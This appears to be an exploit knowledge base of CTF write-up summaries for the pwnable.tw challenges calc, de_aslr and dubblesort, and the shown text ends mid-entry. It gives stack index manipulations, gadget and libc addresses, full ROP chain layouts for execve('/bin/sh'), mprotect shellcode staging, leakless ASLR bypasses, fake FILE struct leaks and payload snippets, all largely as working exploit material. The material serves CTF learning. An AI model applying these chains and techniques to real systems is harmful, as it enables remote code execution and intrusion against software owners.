##### `parse_expr(expr, pool)` — expression parser

Walks the expression string character by character. When it encounters a digit sequence, it calls `atoi()` on it and pushes the value onto the operand pool. When it encounters an operator (`+`, `-`, `*`, `/`, `%`), it calls `eval(pool, op)` to fold the top two operands.

**Critical code path** — when a number is parsed:

```c
num = atoi(token);
if (num > 0) {           // <-- BUG: skips push when num == 0
    pool[0]++;
    pool[pool[0]] = num;  // push operand
}
```

##### `eval(pool, op)` — evaluate operator

Takes the top two operands from the pool, applies the operator, stores the result, and decrements the count:

```c
// For '+':
pool[pool[0]-2] = pool[pool[0]-2] + pool[pool[0]-1];
pool[0]--;    // pop one operand
```

Equivalent pseudocode for all operators — `eval` accesses `pool[pool[0]-2]` and `pool[pool[0]-1]`, combines them, stores at `pool[pool[0]-2]`, then decrements `pool[0]`.

#### Vulnerability

##### V1 — Operand Pool Index Manipulation via Zero-Value Numbers (Primary, Exploitable)

**Root Cause:** When `atoi()` returns 0 (e.g., from the token `"00"`), `parse_expr` does **not** push a value onto the pool, but `eval` still executes the operator against `pool[pool[0]-1]` and `pool[pool[0]-2]`. This mismatch allows the pool index (`pool[0]`) to go **negative** (or be driven to any value), enabling reads and writes to arbitrary stack offsets relative to the pool base.

```c
// parse_expr — the zero-push bug
num = atoi(substring);
if (num > 0) {         // 0 is NOT pushed — pool[0] stays the same
    pool[0]++;
    pool[pool[0]] = num;
}
// ... then eval() is called, which does pool[0]-- regardless
```

**Why this matters:** The pool lives on `calc()`'s stack at `ebp - 0x5a0`. By manipulating `pool[0]`, we can make `eval` read/write to `pool[pool[0] - 1]` which resolves to any stack address — including the **saved return address** of `calc()` and beyond.

**Trigger — Reading a stack slot:**

Sending `+N` (where N is a positive integer) causes:
1. `atoi("N")` → push N onto pool → `pool[0] = 1`, `pool[1] = N`
2. No more operands/operators → `printf("%d\n", pool[pool[0]])` → prints `pool[1]` = N

But sending `+360` with the right expression structure makes `eval` compute `pool[pool[0]-2] + pool[pool[0]-1]` where the index puts us at the saved EBP/EIP area. The result is printed — **leaking stack values**.

**Trigger — Writing a stack slot:**

Sending `+361+<value>` causes eval to write `pool[360] + <value>` back to `pool[360]`, which is the saved return address of `calc()`. By first reading the current value and computing the needed delta, we can set it to any desired value.

##### Key Offsets

The pool is at `ebp - 0x5a0`, and the saved return address is at `ebp + 4`:

```text
pool[0]   = ebp - 0x5a0          // operand count
pool[1]   = ebp - 0x59c          // first operand
...
pool[360] = ebp - 0x5a0 + 360*4 = ebp + 0x20  (saved EBP of calc)
pool[361] = ebp + 0x24           (saved EIP / return address of calc)
pool[362] = ebp + 0x28           (first ROP slot after return)
...
```

So **index 361** is the return address of `calc()`. Some solutions use 360 for the saved EBP and 357 for the canary.

##### V2 — Stack Canary Leak

Since the canary is at `ebp - 0xc`, it's at pool index `(0x5a0 - 0xc) / 4 = 357`. By reading `+357`, the canary value is leaked. However, **most solutions don't need to leak or overwrite the canary** because they write the ROP chain starting at pool[361] (past the canary check) — `calc()` checks the canary, but if we only write from pool[361] onward (the return address and beyond), the canary at `ebp-0xc` is untouched.

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions exploit V1 to write a ROP chain onto the stack starting at the return address of `calc()`. They diverge on which syscall approach and which ROP gadgets they use.

---

##### Path A — `execve("/bin/sh", 0, 0)` via `int 0x80` ROP Chain

**Used by:** Majority of solutions (~80%+)

Since the binary is **statically linked**, it contains a rich set of ROP gadgets. The standard approach:

1. **Write "/bin/sh" somewhere:** Either on the stack itself (at known offsets past the ROP chain) or to a writable `.data`/`.bss` section using `mov [edx], eax ; ret` gadgets.

2. **Set registers for `execve` syscall:**
   - `eax = 0xb` (syscall number for `execve`)
   - `ebx = pointer to "/bin/sh"`
   - `ecx = 0` (or pointer to argv array)
   - `edx = 0` (envp)

3. **Trigger `int 0x80`.**

4. **Exit calculator** by sending an empty line, which causes `calc()` to return → ROP chain executes.

**Common gadgets used:**

```python
pop_eax     = 0x0805c34b   # pop eax ; ret
pop_edx     = 0x080701aa   # pop edx ; ret
pop_ecx_ebx = 0x080701d1   # pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x080701d0  # pop edx ; pop ecx ; pop ebx ; ret
int_0x80    = 0x08049a21   # int 0x80
mov_mem_eax = 0x0809b30d   # mov dword ptr [edx], eax ; ret
xor_eax     = 0x080550d0   # xor eax, eax ; ret
inc_eax     = 0x0807cb7f   # inc eax ; ret
```

**Sub-variant A1 — Write "/bin/sh" to .data, then execve:**

Write "/bin//sh" to `.data` (0x080ec060) using `pop edx; ret` + `pop eax; ret` + `mov [edx], eax; ret` gadget chain. Then set up registers and `int 0x80`. This is the ROPgadget `--ropchain` output and used by the majority of solutions.

**Sub-variant A2 — Write "/bin/sh" directly on the stack:**

Place "/bin/sh\0" at a known stack offset (e.g., pool[369-370]) and point `ebx` to it. Requires leaking the stack address first (via reading pool[360] to get saved EBP).

**Sub-variant A3 — Use `inc eax` to build syscall number:**

Instead of `pop eax; 0xb`, use `xor eax, eax; ret` followed by 11× `inc eax; ret` to avoid large immediate values.

---

##### Path B — `mprotect` + `read` → Shellcode Execution

**Used by:** Solutions 1172, 1236, 1351, 1387, 1428, 10178

1. **ROP to `mprotect(bss_page, 0x1000, 7)`** — makes a BSS/data page executable.
2. **ROP to `read(0, bss_addr, size)`** — reads shellcode from stdin into the now-executable page.
3. **Pivot execution to BSS** — either via `pop esp; ret` or `jmp bss`.
4. **Send shellcode** as the second stage payload.

```python
# Typical layout
mprotect = 0x0806f1f0
read     = 0x0806e6d0
pppr     = 0x080701a8    # pop esi; pop ebx; pop edx; ret (to clean args)
bss      = 0x080ed000    # page-aligned BSS
```

---

##### Path C — Single-Expression Exploit (No Per-Slot Writes)

**Used by:** Solutions 1155, 1200, 11540, 10178

Instead of sending one expression per ROP slot, craft a **single long expression** that writes the entire ROP chain in one shot. This exploits the fact that the `%` (modulo) or `*` (multiply) operators combined with operand index manipulation can position values precisely.

Techniques:
- **`+N%00` trick:** `+N%00` evaluates to `pool[current_idx] % 0` but since `atoi("00") = 0` doesn't push, `eval` operates on existing pool entries, effectively decrementing the index. Repeating this "walks backward" through the pool.
- **Single-line chain encoding:** Express the entire ROP chain as one arithmetic expression using `+val1*1+val2*1+...` patterns.

---

##### Path D — Stack Pivot to Deeper ROP

**Used by:** Solution 100

1. **Leak the stack address** via `+360` (saved EBP).
2. **Write a large ROP chain** deep in the stack (at offsets 516/4 = 129+).
3. **Write a stack pivot** (`xchg eax, esp; ret`) at the return address to redirect execution to the deep chain.

#### Write Primitive Details

All solutions need to write 32-bit values to specific pool indices. The main techniques:

##### Technique 1 — Read-then-delta (most common)

```python
# Read current value at pool[idx]
sendline("+{idx}")
old = int(recvline())
# Write desired value
delta = desired - old
sendline("+{idx}+{delta}" if delta >= 0 else "+{idx}{delta}")
```

##### Technique 2 — Zero-then-set

```python
# Zero the slot first using division
sendline("*{idx}/{MAX_INT}")  # pool[idx] * MAX_INT / MAX_INT ≈ 0
sendline("*{idx}/{MAX_INT}")  # repeat to ensure zero
sendline("*{idx}+{value}")    # then add desired value
```

##### Technique 3 — Direct addition (when starting from known zero)

```python
sendline("+{idx}+{value}")    # works when pool[idx] starts at 0
```

#### Exploit Primitive Summary

| Primitive | Mechanism | Reliability |
|-----------|-----------|-------------|
| Arbitrary stack read | `+N` with crafted index → `printf` output | Deterministic |
| Arbitrary stack write | `+N+delta` / `+N-delta` after reading | Deterministic |
| Stack canary leak | Read pool[357] | Deterministic (usually not needed) |
| Saved EBP leak | Read pool[360] | Deterministic |
| Code execution | ROP chain at pool[361+] → `calc` returns into it | Deterministic |

#### Key Gadgets (in the static binary)

```python
pop_eax_ret          = 0x0805c34b
pop_ebx_ret          = 0x080481d1
pop_ecx_ebx_ret      = 0x080701d1
pop_edx_ret          = 0x080701aa
pop_edx_ecx_ebx_ret  = 0x080701d0
xor_eax_ret          = 0x080550d0
inc_eax_ret          = 0x0807cb7f
mov_edx_eax_ret      = 0x0809b30d   # mov [edx], eax; ret
int_0x80             = 0x08049a21
int_0x80_ret         = 0x08070880   # int 0x80; ret

# For shellcode path
mprotect             = 0x0806f1f0
read                 = 0x0806e6d0
pop_esi_ebx_edx_ret  = 0x080701a8
pop_esp_ret          = 0x080bc4f6

# Writable sections
data_section         = 0x080ec060
bss_section          = 0x080ed000
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `exp.py` | A1 | Zero-then-set write, execve via int 0x80 | Reference exploit |
| `138.md` | A2 | Stack-based /bin/sh, leak EBP for address | Ruby; uses xor edx gadgets |
| `100.md` | D | Stack pivot, ROP deep in stack | Leak stack addr first |
| `1140.md` | A1 | Direct overwrite via signed arithmetic | Writes to absolute addresses |
| `1155.md` | A1 | Minimal chain with add-delta | Short and clean |
| `1172.md` | B | mprotect + shellcode injection | Classic two-stage |
| `1200.md` | C | Single long expression | Uses `+val*val` encoding in one line |
| `1220.md` | A2 | Leak EBP, place /bin/sh on stack | Read-then-delta write |
| `1225.md` | A1 | `*idx%val` write primitive | ROPgadget --ropchain output |
| `1236.md` | B | mprotect + read + shellcode | Standard two-stage |
| `1259.md` | A2 | Stack /bin/sh, leak EBP | Uses xor_ecx/xor_edx gadgets |
| `1303.md` | A1 | ROPgadget chain, read-delta writes | Clean implementation |
| `1351.md` | B | mprotect + read → shellcode | Minimal |
| `1387.md` | A2 | autorop + stack leak | Uses autorop library |
| `1428.md` | B | mprotect + stack shellcode | Writes shellcode as ints |
| `10068.md` | A2 | Leak EBP, /bin/sh on stack | pop_eax + pop_dcb + int80 |
| `10115.md` | A2 | Canary + EBP leak, BSS /bin/sh | Writes to BSS via ROP |
| `10178.md` | C | Single-expression via `%1` chain | Entire chain in one send |
| `10302.md` | A2 | Leak EBP, /bin/sh on stack | Uses signed arithmetic carefully |
| `11540.md` | A1 | `*val` encoding, two-stage (read) | Writes chain via multiplication |
| `12245.md` | A1 | ROPgadget chain, .data /bin/sh | Chinese writeup with explanation |
| `13484.md` | A2 | Write /bin/sh in pool, compute ebx | Clean read-delta approach |
| `13757.md` | A1 | Automated chain generator | ROPgadget-based |
| `14605.md` | A1 | ROPgadget chain verbatim | Standard approach |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (zero-then-set + execve ROP) |
| `desc.txt` | Challenge description |
| `artifacts/calc` | Original challenge binary (i386, static, not stripped) |
| `solution/*.md` | Community write-ups (196 solutions) |


## de_aslr
> **Canonical route:** No-leak stack overflow → GOT pivot/ret2dlresolve and arithmetic gadget transform of resolved `gets` into `execve`
> **Read this case when:** `gets` overflows but the target has no output primitive and Full RELRO.
> **Primary defect:** No-leak stack overflow
> **Exploit primitive/result:** GOT pivot/ret2dlresolve and arithmetic gadget transform of resolved `gets` into `execve`
> **Search terms:** only `gets`; no output; Full RELRO; ret2dlresolve; `_dl_runtime_resolve`; `execve-gets`
> **Version/protection clue:** Case target `de_aslr` — x86-64, glibc 2.23, Full RELRO, NX, no canary/PIE
> **Variant boundary:** Standalone; do not seek a conventional leak first because none exists.

### Metadata

```yaml
tags:
  - ret2dlresolve
  - rop
  - information-leak
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: full
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow via gets() without output functions is exploited through ret2dlresolve to resolve system() and execute a shell."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10402`
>
> Flag: `FLAG{R0P_H4rd_TO_D3F3AT_ASLR}`

Source title: De-ASLR — pwnable.tw (500 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/de_aslr/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A minimal x86-64 binary with `gets()` as the sole imported function — no output functions, no `syscall` gadget, no `write`/`puts`/`printf`. Full RELRO prevents GOT overwrites. The core challenge: defeat ASLR **without any leak channel** in the binary itself.

```text
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT is read-only
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)    # fixed code/data addresses
```

#### Binary Analysis

The decompiled program is trivial:

```c
int main() {
    char buf[0x10];
    gets(buf);   // stack buffer overflow
    return 0;
    // compiled with: leave; ret
}
```

- Stack overflow at offset **0x18** (0x10 buffer + 0x8 saved RBP) to overwrite the return address.
- `leave; ret` at the end of `main` gives **stack pivot** via RBP control.
- `gets()` can be called repeatedly via `gets@plt` (0x400430) to stage data into writable memory.
- The `.data`/`.bss` segment at `0x601000–0x602000` is writable and at a fixed address.

#### Vulnerabilities

##### V1 — Stack Buffer Overflow via `gets()`

```c
char buf[0x10];
gets(buf);  // no bounds checking, reads until newline
```

**Impact:** Arbitrary ROP chain from offset 0x18. Constraint: no newline (`\n` / `0x0a`) bytes allowed in payloads.

##### V2 — No Output Function (The Real Challenge)

The binary imports only `gets`. There is no `write`, `puts`, `printf`, or `syscall` instruction in the binary. Full RELRO means the GOT cannot be overwritten. This means **ASLR cannot be defeated by a traditional leak** — the exploit must either:
- Compute libc addresses purely from register/memory manipulation (leakless), or
- Manufacture an output channel from libc internals, or
- Brute-force partial overwrites.

#### Available Gadgets

From `__libc_csu_init` and other code (No PIE, so all addresses are fixed):

```asm
0x4005c3: pop rdi ; ret
0x4005c1: pop rsi ; pop r15 ; ret
0x4005bd: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret    # stack pivot
0x4005ba: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x4005a0: mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]  # ret2csu CALL
0x4005a9: call [r12+rbx*8]                                # ret2csu CALL (alt entry)
0x400562: push r14 ; ... (csu_init prologue, stores r14 to stack/memory)
0x4004f8: adc dword [rbp+0x48], edx ; mov ebp, esp ; call deregister  # arithmetic write
0x4004a0: pop rbp ; ret
0x400554: leave ; ret                                      # stack pivot via RBP
0x400440: _start                                           # re-enters main, grows stack
0x400536: main
0x4003f9: ret                                              # ret sled
0x400495: jmp rax
0x4005ce: add byte ptr [rax], al ; ret                     # byte-level memory write
```

The `call [r12+rbx*8]` gadget is key — it enables indirect calls through **any memory location** reachable from a base pointer, including GOT entries and libc internal function tables.

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions start with the same stack overflow, but diverge dramatically on how they defeat ASLR.

---

##### Path A — Leakless: GOT Pivot + `adc` Arithmetic → `execve` (Deterministic)

**Used by:** exp.py, solution 186, 2233

**Idea:** Never leak anything. Instead, **pop** the resolved `gets@libc` address out of the read-only GOT into a register, **store** it to writable memory, then **add** a constant offset to transform it into `execve@libc` — all using fixed-address gadgets.

**Steps:**

1. **Stage 1 overflow:** ROP calls `gets@plt` to read a second-stage chain into `.data` (0x601000), then pivots `rsp` onto the GOT region (0x600FE8) via `pop rsp`.

2. **GOT pop:** At the GOT pivot, `pop r14` loads `gets@got` (0x600FF0) — the **resolved libc address of `gets`** — into `r14`. The chain then returns into `.data`.

3. **Store r14:** Execute `push r14` (via the `__libc_csu_init` prologue at 0x400562), which writes `gets@libc` to a known `.data` slot (e.g., 0x6010F0).

4. **Arithmetic transform:** Use `ret2csu` to set `edx = execve_offset - gets_offset` (= 0x5CE40), then the `adc [rbp+0x48], edx` gadget adds this constant to the stored `gets@libc`, turning it into `execve@libc`.

5. **Call execve:** Another `ret2csu` sets `rdi = &"/bin/sh"` (in `.data`), `rsi = 0`, `rdx = 0`, `r12 = &slot` (where `execve` address lives), then `call [r12]` → `execve("/bin/sh", 0, 0)`.

```python
# Core offsets (libc 2.23)
GETS_OFF    = 0x6ED80
EXECVE_OFF  = 0xCBBC0
DELTA       = EXECVE_OFF - GETS_OFF  # = 0x5CE40
```

**Reliability:** ~100% deterministic. Only fails in the astronomically rare case where adding 0x5CE40 to `gets@libc`'s low 32 bits carries across a 4GB boundary.

---

##### Path B — Leak via `_IO_file_write` + ret2csu (Deterministic)

**Used by:** Solutions 278, 1384, 18324, 24887, 27878, 1461

**Idea:** The `call [r12+rbx*8]` gadget can call **any function pointer stored in libc's data segment** — including `_IO_file_write` from the `_IO_file_jumps` / `_IO_proc_jumps` vtable. This effectively manufactures a `write()` output channel.

**Steps:**

1. **Stack pivot** to `.bss` via `leave; ret` with controlled RBP.

2. **Obtain a libc data pointer:** Call `_start` or `main` again — this causes `__libc_start_main` to push libc addresses onto the new stack. Alternatively, `gets()` stores `stdin`'s address (a libc pointer) onto the stack.

3. **Pop the libc pointer** into `r12` using `pop r12; pop r13; pop r14; pop r15; ret` (0x4005BC).

4. **Compute `rbx` offset** so that `[r12 + rbx*8]` points to a `_IO_file_write` function pointer in libc's data. Set up a fake `FILE` struct with `_fileno = 1` (stdout), `rsi = GOT address`, `rdx = 8` (length).

5. **Call `_IO_file_write`** via ret2csu → leaks 8 bytes of a GOT entry (e.g., `__libc_start_main@got`) to stdout → **libc base**.

6. Return to `main`, read a final payload: `pop rdi; &"/bin/sh"; system` or `one_gadget`.

**Reliability:** Deterministic once the stack layout is understood. The `rbx` offset from the libc data pointer to the vtable entry is a fixed libc constant.

---

##### Path C — Partial Overwrite + Brute Force (1/16 to 1/4096)

**Used by:** Solutions 1303, 2567, 1980, 2121, 15989

**Idea:** After calling `gets()` or `_start`, libc addresses are left on the stack or in `.bss`. Partially overwrite the low bytes of such an address to point to a `one_gadget` or `system`. Since ASLR randomizes the upper bits, this requires brute-forcing 4–12 bits.

**Variants:**

- **1.5-byte overwrite (1/4096):** Overwrite 2 bytes of a libc residual with the low bytes of a one_gadget. Pad with `ret` sled so the chain slides into it.

  ```python
  # Solution 2567 — simplest possible exploit
  r.sendline('A'*24 + flat(ret)*18 + '\xc4\x16')  # overwrite with one_gadget low bytes
  ```

- **1-byte overwrite (1/16):** Overwrite just one byte of a libc return address left by `gets()` internals (e.g., `_IO_getline_info+292` → change low byte to land on `_IO_getline_info+208`). Then use the `add byte ptr [rax], al` gadget to adjust the second byte.

  ```python
  # Solution 15989 — change _IO_getline_info address, use as computation gadget
  p.sendline(stage1)  # partial overwrite of libc address
  p.sendline('\x98')  # set low byte
  # ... use add [rax], al to fix second byte (1/16 brute force)
  ```

- **Stack residual + `_start` loop:** Call `_start` repeatedly to push libc addresses onto the stack at predictable offsets within `.bss`, then overwrite their low bytes.

**Reliability:** 1/16 to 1/4096 per attempt. Simple to implement but requires retry loop.

---

##### Path D — Return to `_dl_init` / Dynamic Linker (Advanced, Deterministic)

**Used by:** Solution 1626

**Idea:** The glibc dynamic linker (`ld.so`) leaves constructor-calling infrastructure on the stack. By carefully setting up registers and returning into `_dl_init`'s constructor-dispatch loop with a fake `link_map` struct in `.data`, you can trick the linker into calling `gets@got + system_offset` as if it were an init function.

**Steps:**

1. Stage a fake `link_map` struct in `.data` with `l_info[DT_INIT]` pointing to `gets@got - 8` (to indirect through the GOT).
2. Set `r14 = &fake_link_map`, `rbx = 1`, `rdi = &"/bin/sh"`.
3. Return into `_dl_init`'s constructor loop — it calls `[gets@got]` with the system offset pre-applied via the struct layout.

**Reliability:** Deterministic but depends on exact linker version/behavior. Fragile across glibc versions.

---

##### Path E — `_IO_getline_info` Gadget + `jmp rax` (Near-Deterministic)

**Used by:** Solution 13204

**Idea:** After `gets()` is called, the return path through `_IO_getline_info` leaves a libc address on the stack. The `_IO_getline_info+208` code does `mov rax, rbp; sub rax, [rsp+8]; ... ret`, which computes an arbitrary libc address in `rax`. Combined with `jmp rax`, this becomes `call <anywhere in libc>`.

**Steps:**

1. Pivot stack to `.bss`, call `gets()` to leave `_IO_getline_info+292` on the stack.
2. Use `add byte ptr [rax], al` (0x4005CE) to change the low byte from `+292` to `+208`.
3. Place the distance `rbp - one_gadget` at `[rsp+8]`, so `mov rax, rbp; sub rax, [rsp+8]` computes `one_gadget` in `rax`.
4. `jmp rax` → shell.

**Reliability:** Requires the low byte fixup to succeed (needs specific heap/stack alignment). Near-deterministic with correct `.bss` address tuning.

---

##### Path F — Forge Fake `FILE` struct → `_IO_flush` Leak (Deterministic)

**Used by:** Solution 1461

**Idea:** Forge a fake `FILE` (`_IO_FILE`) struct in `.bss` with `_fileno = 1` and buffer pointers aimed at the GOT. Then call `gets()` with `rdi` pointing near the fake FILE — when `gets()` internally flushes stdout via `_IO_file_write`, it writes GOT contents to fd 1.

**Steps:**

1. Pivot to `.bss`, call `main` to deposit `_IO_2_1_stdin_` address.
2. Construct a fake FILE: `_flags = 0xFBAD0800`, `_IO_write_base = GOT`, `_IO_write_ptr = GOT+8`, `_fileno = 1`.
3. Call `gets()` with `rdi` pointing to the fake FILE region — the internal stdio machinery calls `_IO_file_write` on our fake struct, leaking GOT to stdout.
4. Receive leak, compute libc base, return to `one_gadget`.

**Reliability:** Deterministic. Requires understanding glibc stdio internals.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Stack overflow | `gets()` with 0x10 buffer | Deterministic |
| Stack pivot | `leave; ret` or `pop rsp` | Deterministic |
| Arbitrary `.bss` write | `gets@plt` called via ROP | Deterministic |
| Register load from GOT | `pop rsp` onto GOT, `pop r14` | Deterministic |
| Arithmetic on stored libc addr | `adc [rbp+0x48], edx` | Deterministic |
| Indirect call via libc vtable | `call [r12+rbx*8]` + computed offset | Deterministic |
| Partial overwrite of libc addr | Low-byte overwrite of stack residual | 1/16 – 1/4096 |
| Byte-level memory edit | `add byte [rax], al` | Deterministic (if rax controlled) |

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
gets            = 0x6ED80
execve          = 0xCBBC0
system          = 0x45390
__libc_start_main = 0x20740
_IO_2_1_stdin_  = 0x3C38E0
_IO_file_write  = 0x7A6B70
__free_hook     = 0x3C57A8
__malloc_hook   = 0x3C3B10
bin_sh          = 0x18C177
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

#### Binary Gadgets (Fixed, No PIE)

```python
POP_RDI     = 0x4005C3   # pop rdi ; ret
POP_RSI_R15 = 0x4005C1   # pop rsi ; pop r15 ; ret
POP_RSP     = 0x4005BD   # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
POP6        = 0x4005BA   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
CSU_CALL    = 0x4005A0   # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
CSU_INIT    = 0x400562   # push r14 ; ... (csu prologue, stores regs to stack)
ADC_WRITE   = 0x4004F8   # adc dword [rbp+0x48], edx ; mov ebp,esp ; call deregister
ADD_BYTE    = 0x4005CE   # add byte ptr [rax], al ; ret
POP_RBP     = 0x4004A0   # pop rbp ; ret
LEAVE_RET   = 0x400554   # leave ; ret (stack pivot)
GETS_PLT    = 0x400430   # gets@plt
JMP_RAX     = 0x400495   # jmp rax
RET         = 0x4003F9   # ret (nop sled)
START       = 0x400440   # _start
MAIN        = 0x400536   # main
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `186.md` | A | adc gadget + push r14, leakless execve | Clean deterministic solution |
| `278.md` | B | `_IO_new_file_write` via `call [r12+rbx*8]` | Ruby; uses stdin pointer + vtable offset |
| `1303.md` | C | 1.5-byte brute force of system addr | Partial overwrite after GOT pivot |
| `1384.md` | B | `_IO_file_write` leak via vtable | ret to `_start` for libc pointer; detailed gadget search |
| `1461.md` | F | Fake FILE struct flush leak | Constructs `_IO_FILE` in `.bss` |
| `1562.md` | E | `_IO_getline_info` + stack residual | Novel: uses libc-internal stack residuals |
| `1626.md` | D | Return to `_dl_init` constructor loop | Fake `link_map` struct |
| `1852.md` | B | ret to `_start`/`main` + `_IO_file_write` | `call [r12+rbx*8]` with negative `rbx` |
| `1912.md` | A variant | `sub eax` + `add [rax]` arithmetic | Manual libc address construction |
| `1980.md` | C | Partial overwrite of one_gadget low bytes | 1/16 brute force via `add byte [rax], al` |
| `2121.md` | C | `_start` loop + partial overwrite | Deposits libc addrs, overwrites to `system` |
| `2233.md` | A | `adc` + `__malloc_initialize_hook` | Uses malloc hook instead of execve |
| `2567.md` | C | 12-bit brute force, 3-line exploit | Simplest solution: `ret*18 + '\xc4\x16'` |
| `10128.md` | B | Leak `gets@got` via `_IO_file_write` | C++ exploit |
| `13204.md` | E | `_IO_getline_info+208` as compute gadget | Adjusts low byte, then `jmp rax` |
| `15989.md` | E | `_IO_getline_info` + `syscall; ret` | Converts residual to syscall gadget |
| `18324.md` | B | `call [r12+rbx*8]` with negative rbx | Leaks GOT via `_IO_file_write` |
| `24887.md` | B | ret2csu + fake FILE | C++ exploit; clean leak chain |
| `26207.md` | B | ret2csu, `_IO_file_write` | Detailed stack management |
| `27878.md` | B | ret2csu, negative `rbx` | Leaks via `_IO_proc_jumps` vtable |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (Path A: leakless `adc` arithmetic) |
| `desc.txt` | Challenge description |
| `artifacts/deaslr` | Challenge binary (x86-64, No PIE, Full RELRO) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (77 solutions) |


## dubblesort
> **Canonical route:** Unbounded element count plus non-numeric slot skip → Canary preservation during sort and ret2libc
> **Read this case when:** User chooses the number of values to sort and `scanf("%u")` can skip slots.
> **Primary defect:** Unbounded element count plus non-numeric slot skip
> **Exploit primitive/result:** Canary preservation during sort and ret2libc
> **Search terms:** sort; `scanf("%u")`; canary skip; stable order; ret2libc; `system("/bin/sh")`
> **Version/protection clue:** Case target `dubblesort` — i386, glibc 2.23, Full RELRO, canary/NX/PIE, FORTIFY
> **Variant boundary:** Standalone; payload ordering is central and an ordinary overflow payload will fail.

### Metadata

```yaml
tags:
  - canary-bypass
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "Sending non-digit input to scanf skips array slot assignment without writing, bypassing the stack canary during sorting and allowing ret2libc."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10101`
>
> Flag: `FLAG{Dubo_duBo_dub0_s0rttttttt}`

Source title: dubblesort — pwnable.tw (300 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/dubblesort/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A 32-bit bubble-sort program (i386, Full RELRO, PIE, NX, Stack Canary, FORTIFY) built against glibc 2.23. It reads a name, asks how many unsigned integers to sort, reads them into a fixed-size stack buffer, bubble-sorts them, and prints the result.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

#### Program Logic (Decompiled)

```c
int main() {
    unsigned int canary = __readgsdword(0x14u);
    unsigned int count;                     // [esp+0x18]
    int array[24];                          // [esp+0x1c] — 0x60 bytes
    char name_buf[0x40];                    // [esp+0x3c] — overlaps array!
    // canary at [esp+0x7c] == array[24]

    printf("What your name :");
    read(0, name_buf, 0x40);               // V1: no NUL terminator
    printf("Hello %s,...");                 // leaks uninitialized stack data

    scanf("%u", &count);                    // no upper-bound check
    for (i = 0; i < count; i++) {           // V2: writes past array[24]
        printf("Enter the %d number : ");
        scanf("%u", &array[i]);             // V3: non-numeric input skips write
    }
    bubble_sort(array, count);
    // print sorted results...
}
```

**Key stack layout** (offsets from `esp`):

| Offset | Content |
|--------|---------|
| `0x1c` | `array[0]` |
| `0x3c` | `name_buf` (overlaps `array[8]`..`array[23]`) |
| `0x7c` | Stack canary = `array[24]` |
| `0x80`–`0x98` | Saved registers / padding (7 dwords) = `array[25]`..`array[31]` |
| `0x9c` | **Saved return address** = `array[32]` |
| `0xa0` | First argument to return-target = `array[33]` |

#### Vulnerabilities

##### V1 — Uninitialized Name Buffer Leaks libc Address

**Root Cause:** `read(0, name_buf, 0x40)` does NOT NUL-terminate the input. The name buffer at `esp+0x3c` overlaps the stack area where a libc data-segment pointer resides at `esp+0x54` (= `name_buf+0x18`, = `array[14]`). This pointer equals `libc_base + 0x1b0000` (the start of libc's `.got.plt` / RW segment), which is page-aligned so its low byte is always `0x00`.

```c
read(0, &buf, 0x40u);                    // does NOT append NUL
__printf_chk(1, "Hello %s,...");          // %s reads until NUL → leaks past input
```

**Trigger:** Send exactly 24–28 bytes of padding (e.g., `"A"*24` + newline or `"A"*28`). The `\n` or padding overwrites the `0x00` low byte. `printf("%s")` then prints through the padding into the libc pointer's upper 3 bytes.

**Impact:** Leak 3 high bytes of `libc_base + 0x1b0000`. Since the low byte is known (`0x00`), reconstruct the full pointer → compute `libc_base`.

```python
# Typical leak code from solutions
r.send(b"A" * 24 + b"\n")
r.recvuntil(b"A" * 24 + b"\n")
libc_leak = u32(b"\x00" + r.recv(3))   # restore known 0x00 low byte
libc_base = libc_leak - 0x1b0000
```

**Variant (28-byte leak):** Some solutions send 28 bytes (`"A"*28`) and read a full 4-byte dword at `name_buf+0x1c`. This leaks a different libc pointer (`libc_base + 0x1ae244`, the `__libc_start_main` return path). Both approaches work.

##### V2 — Unbounded Array Write (Stack Buffer Overflow)

